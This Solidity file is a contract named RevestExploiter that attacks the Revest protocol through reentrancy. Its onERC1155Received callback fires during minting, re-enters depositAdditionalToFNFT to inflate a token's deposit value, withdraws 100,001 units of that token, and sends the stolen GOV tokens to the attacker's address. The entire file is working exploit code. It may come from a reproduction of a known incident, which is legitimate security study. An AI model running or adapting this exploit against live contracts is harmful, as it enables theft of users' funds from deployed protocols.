//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IRevest {
    function withdrawFNFT(uint fnftId, uint quantity) external;
    function depositAdditionalToFNFT(
        uint fnftId,
        uint amount,
        uint quantity
    ) external returns (uint);
}

/// @dev Exploiter contract
contract RevestExploiter is ERC1155Receiver {

    IERC20 gov;
    IRevest revest;
    address attacker;
    bool triggerCallback;

    constructor(address revestAddress, address govAddress) {
        revest = IRevest(revestAddress);
        attacker = msg.sender;
        gov = IERC20(govAddress);
        gov.approve(revestAddress, 1e18);
    }

    function setTrigger(bool _trigger) external {
        triggerCallback = _trigger;
    }

    /// @dev Callback during _mint
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        if (triggerCallback) {
            // depositAdditionalToFNFT will call mint again, triggering onERC1155Received
            // we don't want this to happen, so we set triggerCallback to false
            triggerCallback=false;
            revest.depositAdditionalToFNFT(1, 1e18, 1); // updates the depositAmount for fnftId=2 to 1e18
            revest.withdrawFNFT(2, 100_001); // withdraw 100_001 from fnftId=2
            gov.transfer(attacker,gov.balanceOf(address(this))); // send GOV tokens to attacker
        }

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {
        return bytes4(0); // not accepted
    }

}